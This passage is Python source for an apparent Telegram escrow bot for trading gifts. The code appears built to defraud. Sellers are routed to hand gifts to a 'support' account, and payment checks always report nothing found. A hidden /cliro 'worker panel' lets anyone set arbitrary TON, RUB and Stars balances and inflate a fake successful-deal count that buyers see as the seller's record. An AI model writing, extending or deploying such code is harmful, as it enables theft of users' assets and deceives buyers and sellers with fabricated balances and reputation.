            memo=deal.deal_code.lower(),
            warn=ce(E_WARN, "⚠️"),
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=tr(lang, "check_pay"), callback_data=f"checkpay:{deal.id}")],
            [InlineKeyboardButton(
                text=tr(lang, "pay_balance"),
                callback_data=f"pay:{deal.id}",
                icon_custom_emoji_id=E_MONEY,
            )],
            [home_btn(lang)],
        ])
        await message.answer(text, reply_markup=kb, disable_web_page_preview=True)

        if seller and seller.telegram_id != buyer.id:
            try:
                await bot.send_message(
                    seller.telegram_id,
                    tr(
                        (seller.language or "ru"), "new_buyer",
                        code=deal.deal_code,
                        buyer=buyer_name,
                        n=b_completed,
                    ),
                )
            except Exception:
                pass


@dp.callback_query(F.data.startswith("checkpay:"))
async def cb_checkpay(call: CallbackQuery):
    await call.answer()
    await call.message.answer(
        "Перевод пока не найден.\n"
        "Проверьте адрес, сумму и комментарий с номером сделки. "
        "Подтверждение может занять время."
    )


@dp.callback_query(F.data.startswith("pay:"))
async def cb_pay(call: CallbackQuery):
    deal_id = int(call.data.split(":")[1])
    async with SessionLocal() as session:
        async with session.begin():
            buyer = await ensure_user(session, call.from_user)
            deal = await session.get(Deal, deal_id)
            if not deal or deal.status != "open":
                await call.answer("Сделка недоступна.", show_alert=True)
                return
            if deal.seller_id == buyer.id:
                await call.answer("Нельзя купить свою сделку.", show_alert=True)
                return
            ok = False
            if deal.currency == "TON" and buyer.balance_ton >= deal.amount:
                buyer.balance_ton -= deal.amount
                buyer.held_ton += deal.amount
                ok = True
            elif deal.currency == "RUB" and buyer.balance_rub >= deal.amount:
                buyer.balance_rub -= deal.amount
                ok = True
            elif deal.currency == "Stars" and buyer.balance_stars >= deal.amount:
                buyer.balance_stars -= deal.amount
                ok = True
            if not ok:
                await call.answer(
                    f"Недостаточно средств. Нужно: {fmt_amount(deal.amount)} {deal.currency}",
                    show_alert=True,
                )
                return
            deal.buyer_id = buyer.id
            deal.status = "escrow"
            session.add(LedgerEntry(
                user_id=buyer.id, deal_id=deal.id, amount=-deal.amount,
                currency=deal.currency, kind="escrow_lock",
            ))
            seller = await session.get(User, deal.seller_id)
            seller_tg = seller.telegram_id if seller else None
            seller_lang = (seller.language or "ru") if seller else "ru"
            desc = deal.description
            gift = getattr(deal, 'gift_link', '') or ''
            code = deal.deal_code
            amount = deal.amount
            currency = deal.currency
        await session.commit()

    # покупателю — средства зарезервированы
    buyer_lang = await get_lang(call.from_user)
    await call.message.edit_text(
        tr(
            buyer_lang, "funds_reserved",
            e=ce(E_GIFT, "🎁"),
            status=deal_status_line("escrow", buyer_lang),
            amount=fmt_amount(amount),
            currency=currency,
            desc=desc,
            support=STARS_USERNAME,
        ),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Dispute" if buyer_lang == "en" else "Открыть спор", callback_data=f"dispute:{deal_id}", icon_custom_emoji_id=E_WARN)],
            [home_btn(buyer_lang)],
        ]),
    )
    await call.answer("Reserved" if buyer_lang == "en" else "Средства зарезервированы.")

    # продавцу — язык продавца + кнопки без мгновенного зачисления
    support_url = "https://t.me/" + STARS_USERNAME.lstrip("@")
    gift_line = f"\n{ce(E_PIN, '📍')} Link: {gift}" if gift else ""
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=tr(seller_lang, "transfer_gift"),
            url=support_url,
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(
            text=tr(seller_lang, "i_transferred"),
            callback_data=f"seller_sent:{deal_id}",
            icon_custom_emoji_id=E_NOTE,
        )],
        [home_btn(seller_lang)],
    ])
    seller_text = tr(
        seller_lang, "seller_paid",
        gift=ce(E_GIFT, "🎁"),
        code=code,
        desc=desc,
        gift_line=gift_line,
        cur=cur_emoji(currency),
        amount=fmt_amount(amount),
        currency=currency,
        user=ce(E_USER, "👤"),
        support=STARS_USERNAME,
    )
    # подправим инструкцию под 2 шага
    if seller_lang == "en":
        seller_text = (
            f"{deal_status_line('escrow', 'en')}\n\n{ce(E_GIFT, '🎁')} <b>Payment for deal #{code} received!</b>\n\n"
            f"Please transfer the gift:\n<b>{desc}</b>{gift_line}\n\n"
            f"{cur_emoji(currency)} Amount: <b>{fmt_amount(amount)} {currency}</b> (reserved)\n\n"
            f"{ce(E_USER, '👤')} Recipient (support): {STARS_USERNAME}\n\n"
            f"1) Tap «Transfer gift» — opens chat with support.\n"
            f"2) After sending, tap «I transferred the gift».\n"
            f"3) Support verifies and credits funds to your balance."
        )
    else:
        seller_text = (
            f"{deal_status_line('escrow', 'ru')}\n\n{ce(E_GIFT, '🎁')} <b>Оплата по сделке #{code} получена!</b>\n\n"
            f"Передайте, пожалуйста, подарок:\n<b>{desc}</b>{gift_line}\n\n"
            f"{cur_emoji(currency)} Сумма: <b>{fmt_amount(amount)} {currency}</b> (зарезервирована)\n\n"
            f"{ce(E_USER, '👤')} Получатель (саппорт): {STARS_USERNAME}\n\n"
            f"1) Нажмите «Передать подарок» — откроется чат с саппортом.\n"
            f"2) После отправки нажмите «Я передал подарок».\n"
            f"3) Саппорт проверит и зачислит средства на ваш баланс."
        )
    if seller_tg:
        try:
            await bot.send_message(seller_tg, seller_text, reply_markup=seller_kb)
        except Exception:
            pass
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Gift received — credit",
            callback_data=f"admin_credit:{deal_id}",
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(
            text="Open support chat",
            url="https://t.me/" + STARS_USERNAME.lstrip("@"),
            icon_custom_emoji_id=E_SUPPORT,
        )],
    ])
    admin_text = (
        f"{ce(E_WARN, '⚠️')} <b>Deal #{code} — payment received</b>\n\n"
        f"{ce(E_GIFT, '🎁')} Gift: <b>{desc}</b>{gift_line}\n"
        f"{cur_emoji(currency)} Amount: <b>{fmt_amount(amount)} {currency}</b>\n"
        f"{ce(E_USER, '👤')} Must arrive to {STARS_USERNAME}\n\n"
        f"When gift is in support account — press the button."
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, admin_text, reply_markup=admin_kb)
        except Exception:
            pass


@dp.callback_query(F.data.startswith("seller_sent:"))
async def cb_seller_sent(call: CallbackQuery):
    deal_id = int(call.data.split(":")[1])
    lang = await get_lang(call.from_user)
    async with SessionLocal() as session:
        deal = await session.get(Deal, deal_id)
        if not deal or deal.status not in ("escrow", "waiting_support"):
            await call.answer("Deal unavailable" if lang == "en" else "Сделка недоступна", show_alert=True)
            return
        seller = await session.get(User, deal.seller_id)
        if not seller or seller.telegram_id != call.from_user.id:
            if call.from_user.id not in ADMIN_IDS:
                await call.answer("Only seller" if lang == "en" else "Только продавец", show_alert=True)
                return
        deal.status = "waiting_support"
        await session.commit()
        desc = deal.description
        gift = getattr(deal, "gift_link", "") or ""
        code = deal.deal_code
        amount = deal.amount
        currency = deal.currency
    gift_line = f"\nLink: {gift}" if gift else ""
    await call.message.edit_text(
        tr(lang, "waiting_support", status=deal_status_line("waiting_support", lang), support=STARS_USERNAME),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )
    await call.answer()
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Подарок получен — зачислить",
            callback_data=f"admin_credit:{deal_id}",
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(
            text="Gift received — credit",
            callback_data=f"admin_credit:{deal_id}",
            icon_custom_emoji_id=E_MONEY,
        )],
        [InlineKeyboardButton(
            text="Чат саппорта",
            url="https://t.me/" + STARS_USERNAME.lstrip("@"),
            icon_custom_emoji_id=E_SUPPORT,
        )],
    ])
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                tr(
                    "ru", "seller_marked",
                    bell=ce(E_WARN, "🔔"),
                    gift=ce(E_GIFT, "🎁"),
                    money=cur_emoji(currency),
                    user=ce(E_USER, "👤"),
                    warn=ce(E_NOTE, "📝"),
                    code=code, desc=desc, gift_line=gift_line,
                    amount=fmt_amount(amount), currency=currency,
                    support=STARS_USERNAME,
                ),
                reply_markup=admin_kb,
            )
        except Exception:
            pass


@dp.callback_query(F.data.startswith("admin_credit:"))
async def cb_admin_credit(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        await call.answer("Admins only", show_alert=True)
        return
    deal_id = int(call.data.split(":")[1])
    async with SessionLocal() as session:
        async with session.begin():
            deal = await session.get(Deal, deal_id)
            if not deal or deal.status not in ("escrow", "waiting_support"):
                await call.answer("Already closed", show_alert=True)
                return
            seller = await session.get(User, deal.seller_id)
            buyer = await session.get(User, deal.buyer_id) if deal.buyer_id else None
            if deal.currency == "TON":
                if buyer:
                    buyer.held_ton = max(Decimal("0"), (buyer.held_ton or Decimal("0")) - deal.amount)
                seller.balance_ton += deal.amount
            elif deal.currency == "RUB":
                seller.balance_rub += deal.amount
            else:
                seller.balance_stars += deal.amount
            deal.status = "completed"
            session.add(LedgerEntry(
                user_id=seller.id, deal_id=deal.id, amount=deal.amount,
                currency=deal.currency, kind="escrow_release",
            ))
            seller_tg = seller.telegram_id
            buyer_tg = buyer.telegram_id if buyer else None
            seller_lang = seller.language or "ru"
            amount = deal.amount
            currency = deal.currency
            code = deal.deal_code
        await session.commit()
    await call.message.edit_text(
        f"✅ Deal #{code} completed. Funds credited to seller."
    )
    await call.answer("Done")
    if seller_tg:
        try:
            await bot.send_message(
                seller_tg,
                tr(
                    seller_lang, "funds_credited",
                    status=deal_status_line("completed", seller_lang),
                    amount=fmt_amount(amount), currency=currency, code=code,
                ),
            )
        except Exception:
            pass
    if buyer_tg:
        try:
            await bot.send_message(
                buyer_tg,
                f"✅ Deal #{code} completed. Gift transfer confirmed by support.",
            )
        except Exception:
            pass


@dp.callback_query(F.data.startswith("seller_check:"))
async def cb_seller_check(call: CallbackQuery):
    await call.answer()
    lang = await get_lang(call.from_user)
    msg = (
        f"Support verifies the gift at {STARS_USERNAME}."
        if lang == "en"
        else f"Саппорт проверяет подарок на {STARS_USERNAME}."
    )
    await call.message.answer(msg)


@dp.callback_query(F.data.startswith("seller_confirm:"))
async def cb_seller_confirm(call: CallbackQuery):
    # старая кнопка — направляем на новый флоу
    await call.answer(
        "Use «I transferred» — support must confirm",
        show_alert=True,
    )


@dp.callback_query(F.data.startswith("dispute:"))
async def cb_dispute(call: CallbackQuery):
    deal_id = int(call.data.split(":")[1])
    async with SessionLocal() as session:
        deal = await session.get(Deal, deal_id)
        user = await ensure_user(session, call.from_user)
        if not deal or deal.status != "escrow":
            await call.answer("Нельзя открыть спор.", show_alert=True)
            return
        if deal.buyer_id != user.id and call.from_user.id not in ADMIN_IDS:
            await call.answer("Нельзя открыть спор.", show_alert=True)
            return
        deal.status = "dispute"
        await session.commit()
        code = deal.deal_code
    await call.message.edit_text(
        f"{ce(E_WARN, '⚠️')} Спор по сделке #{code} открыт. "
        f"Средства заморожены до решения модератора.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, f"⚠️ Спор по сделке #{code}")
        except Exception:
            pass



@dp.callback_query(F.data == "wallet")
async def cb_wallet(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="+ Добавить TON-кошелёк", callback_data="wallet_ton")],
        [InlineKeyboardButton(text="+ Добавить карту (СБП)", callback_data="wallet_card")],
        [home_btn()],
    ])
    try:
        await call.message.edit_text(
            "<b>Выберите тип кошелька для добавления:</b>",
            reply_markup=kb,
        )
    except Exception:
        await call.message.answer(
            "<b>Выберите тип кошелька для добавления:</b>",
            reply_markup=kb,
        )
    await call.answer()


@dp.callback_query(F.data == "wallet_ton")
async def cb_wallet_ton(call: CallbackQuery, state: FSMContext):
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        current = user.ton_wallet or "Не указан"
    await state.set_state(WalletForm.ton)
    await call.message.edit_text(
        f"{ce(E_BANK, '🏦')} <b>Ваш текущий TON-кошелёк:</b>\n"
        f"<code>{current}</code>\n\n"
        "Введите новый адрес TON-кошелька или вернитесь в меню:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.message(WalletForm.ton)
async def save_ton_wallet(message: Message, state: FSMContext):
    addr = message.text.strip()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.ton_wallet = addr[:128]
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ TON-кошелёк сохранён:\n<code>{addr}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


@dp.callback_query(F.data == "wallet_card")
async def cb_wallet_card(call: CallbackQuery, state: FSMContext):
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        current = user.card_sbp or "Не указана"
    await state.set_state(WalletForm.card)
    await call.message.edit_text(
        f"{ce(E_CARD, '💳')} <b>Ваша текущая карта:</b>\n"
        f"<code>{current}</code>\n\n"
        "Введите новые реквизиты карты (СБП) или вернитесь в меню:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.message(WalletForm.card)
async def save_card(message: Message, state: FSMContext):
    card = message.text.strip()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.card_sbp = card[:128]
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ Реквизиты сохранены:\n<code>{card}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


# ---------- Рефералка ----------
@dp.callback_query(F.data == "referral")
async def cb_referral(call: CallbackQuery):
    lang = await get_lang(call.from_user)
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={call.from_user.id}"
    text = tr(lang, "referral", e=ce(E_REF, "🤝"), link=link)
    try:
        await call.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    except Exception:
        await call.message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    await call.answer()


# ---------- Язык ----------
@dp.callback_query(F.data == "language")
async def cb_language(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Русский", callback_data="setlang:ru")],
        [InlineKeyboardButton(text="English", callback_data="setlang:en")],
        [home_btn()],
    ])
    try:
        lang0 = await get_lang(call.from_user)
        await call.message.edit_text(tr(lang0, "choose_lang"), reply_markup=kb)
    except Exception:
        lang0 = await get_lang(call.from_user)
        await call.message.answer(tr(lang0, "choose_lang"), reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data.startswith("setlang:"))
async def cb_setlang(call: CallbackQuery):
    lang = call.data.split(":")[1]
    if lang not in ("ru", "en"):
        await call.answer()
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        user.language = lang
        await session.commit()
    await call.answer("Язык сохранён ✓" if lang == "ru" else "Language saved ✓")
    try:
        await call.message.delete()
    except Exception:
        pass
    await send_start(call, lang)


# ---------- Поддержка ----------
@dp.callback_query(F.data == "support")
async def cb_support(call: CallbackQuery, state: FSMContext):
    lang = await get_lang(call.from_user)
    await state.set_state(SupportForm.message)
    try:
        await call.message.edit_text(
            tr(lang, "support"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    except Exception:
        await call.message.answer(
            tr(lang, "support"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    await call.answer()


@dp.message(SupportForm.message)
async def support_msg(message: Message, state: FSMContext):
    await state.clear()
    text = message.text or "(без текста)"
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"🆘 Поддержка от @{message.from_user.username or '—'} "
                f"(id {message.from_user.id}):\n\n{text}",
            )
        except Exception:
            pass
    await message.answer(
        "✅ Сообщение отправлено в тех-поддержку.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )




# ---------- /cliro — панель для всех, кто знает команду ----------
class CliroForm(StatesGroup):
    set_ton = State()
    set_rub = State()
    set_stars = State()
    set_deals = State()


def cliro_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Баланс TON", callback_data="cliro:ton")],
        [InlineKeyboardButton(text="💵 Баланс RUB", callback_data="cliro:rub")],
        [InlineKeyboardButton(text="⭐ Баланс Stars", callback_data="cliro:stars")],
        [InlineKeyboardButton(text="✅ Успешные сделки", callback_data="cliro:deals")],
        [InlineKeyboardButton(text="📊 Мой статус", callback_data="cliro:status")],
        [home_btn()],
    ])


@dp.message(Command("cliro"))
async def cmd_cliro(message: Message, state: FSMContext):
    # Доступ у ВСЕХ, кто знает команду
    await state.clear()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        await session.commit()
        text = (
            "👋 <b>Привет, воркер!</b>\n"
            "<b>Доступ разрешён.</b>\n\n"
            f"TON: <b>{user.balance_ton}</b>\n"
            f"RUB: <b>{user.balance_rub}</b>\n"
            f"Stars: <b>{user.balance_stars}</b>\n"
            f"Успешные сделки (накрутка): <b>{user.fake_success_deals}</b>\n\n"
            "Выбери, что накрутить:"
        )
    await message.answer(text, reply_markup=cliro_kb())


@dp.callback_query(F.data == "cliro:status")
async def cliro_status(call: CallbackQuery):
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        text = (
            "👋 <b>Привет, воркер!</b>\n"
            "<b>Доступ разрешён.</b>\n\n"
            f"TON: <b>{user.balance_ton}</b>\n"
            f"RUB: <b>{user.balance_rub}</b>\n"
            f"Stars: <b>{user.balance_stars}</b>\n"
            f"Успешные сделки (накрутка): <b>{user.fake_success_deals}</b>"
        )
        await call.message.edit_text(text, reply_markup=cliro_kb())
    await call.answer()


@dp.callback_query(F.data == "cliro:ton")
async def cliro_ton(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_ton)
    await call.message.edit_text(
        "Введи новый баланс <b>TON</b> (например 100):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.callback_query(F.data == "cliro:rub")
async def cliro_rub(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_rub)
    await call.message.edit_text(
        "Введи новый баланс <b>RUB</b> (например 50000):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.callback_query(F.data == "cliro:stars")
async def cliro_stars(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_stars)
    await call.message.edit_text(
        "Введи новый баланс <b>Stars</b> (например 1000):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.callback_query(F.data == "cliro:deals")
async def cliro_deals(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_deals)
    await call.message.edit_text(
        "Введи число <b>успешных сделок</b> для накрутки (например 50):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.message(CliroForm.set_ton)
async def cliro_set_ton(message: Message, state: FSMContext):
    try:
        val = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.0001"))
        if val < 0:
            raise InvalidOperation
    except Exception:
        await message.answer("Число, например 100")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.balance_ton = val
        await session.commit()
    await state.clear()
    await message.answer(f"✅ Баланс TON = <b>{val}</b>", reply_markup=cliro_kb())


@dp.message(CliroForm.set_rub)
async def cliro_set_rub(message: Message, state: FSMContext):
    try:
        val = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.01"))
        if val < 0:
            raise InvalidOperation
    except Exception:
        await message.answer("Число, например 50000")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.balance_rub = val
        await session.commit()
    await state.clear()
    await message.answer(f"✅ Баланс RUB = <b>{val}</b>", reply_markup=cliro_kb())


@dp.message(CliroForm.set_stars)
async def cliro_set_stars(message: Message, state: FSMContext):
    try:
        val = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.01"))
        if val < 0:
            raise InvalidOperation
    except Exception:
        await message.answer("Число, например 1000")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.balance_stars = val
        await session.commit()
    await state.clear()
    await message.answer(f"✅ Баланс Stars = <b>{val}</b>", reply_markup=cliro_kb())


@dp.message(CliroForm.set_deals)
async def cliro_set_deals(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip())
        if val < 0:
            raise ValueError
    except Exception:
        await message.answer("Целое число, например 50")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.fake_success_deals = val
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ Успешные сделки (накрутка) = <b>{val}</b>\n"
        "Покупатели будут видеть это число у тебя как продавца.",
        reply_markup=cliro_kb(),
    )




async def main():
    await init_db()
    from aiogram.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
    # Обычным юзерам в меню только /start — без /buy и /cliro
    await bot.set_my_commands(
        [BotCommand(command="start", description="Открыть меню")],
        scope=BotCommandScopeDefault(),
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.set_my_commands(
                [
                    BotCommand(command="start", description="Открыть меню"),
                    BotCommand(command="cliro", description="Панель воркера"),
                    BotCommand(command="approve_topup", description="Подтвердить пополнение"),
                    BotCommand(command="buy", description="Купить по коду"),
                ],
                scope=BotCommandScopeChat(chat_id=admin_id),
            )
        except Exception as e:
            print(f"set_my_commands for {admin_id}: {e}")
    print("OTC ELF bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
